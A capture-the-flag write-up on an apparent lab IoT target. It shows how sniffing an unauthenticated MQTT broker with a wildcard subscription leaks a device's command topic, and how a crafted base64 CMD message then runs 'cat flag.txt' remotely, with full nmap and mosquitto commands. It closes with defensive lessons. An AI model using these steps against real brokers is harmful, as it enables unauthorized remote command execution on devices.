# Bugged — Write-up

## Objective

John likes to live in a very Internet-connected world. Maybe too connected...

**Questions to answer:**

- What is the flag?

---

## Initial Recon

```bash
nmap -sS 10.81.176.184 -p-
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
1883/tcp open  mqtt
```

Port `1883` — MQTT — is the interesting one here.

---

## Sniffing MQTT Traffic

Subscribing to every topic on the broker:

```bash
mosquitto_sub -h 10.81.176.184 -t '#' -v
```

```
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

A device is publishing a base64-encoded config blob to a topic. Decoding it:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

This reveals the device's own **pub** and **sub** topics — where it publishes responses, and where it listens for commands — plus a device `id` and a set of registered commands: `HELP`, `CMD`, and `SYS`.

---

## Talking to the Device

First, I subscribed to the device's publish topic to see its responses:

```bash
mosquitto_sub -h 10.81.176.184 -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -v
```

Then, using the `sub_topic` and the device's own `id`, I sent it a `CMD` command — base64-encoded, matching the format of the config message — to read the flag file:

```bash
mosquitto_pub -h 10.81.176.184 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}' | base64 -w0)"
```

The device responded on its publish topic with:

```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
```

Decoding this finally gave me the last flag:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707##########b83db54013}\n"}
```

**Flag:** `flag{18d44fc0707##########b83db54013}`

---

## Summary

- **Recon:** Nmap found only SSH and an open MQTT broker (port 1883) — no authentication needed to interact with it.
- **Wildcard subscription:** Subscribing to the root wildcard topic (`#`) exposed *every* message flowing through the broker, including a device's own base64-encoded config — its ID, supported commands, and its dedicated pub/sub topic pair.
- **Command injection over MQTT:** With the device's `id` and `sub_topic` known, a `CMD` message could be crafted and published directly to the device, since nothing on the broker validated who was allowed to publish there.
- **Arbitrary command execution:** The device happily ran the supplied `cat flag.txt` command and published the result back on its own `pub_topic`, handing over the flag.

**Key takeaways:**

- MQTT brokers with no authentication or ACLs let anyone subscribe to `#` and see all traffic — including "private" device config and command channels that were only ever protected by topic-name obscurity.
- A device accepting arbitrary shell-like commands (`CMD` + `arg`) over an unauthenticated pub/sub channel is effectively unauthenticated remote code execution — the "id" field provides no real access control since it's broadcast in the clear.
- IoT/MQTT deployments need broker-level authentication, per-topic ACLs, and TLS at minimum; topic names alone (even random-looking ones) are not a substitute for access control once the whole topic tree can be sniffed.
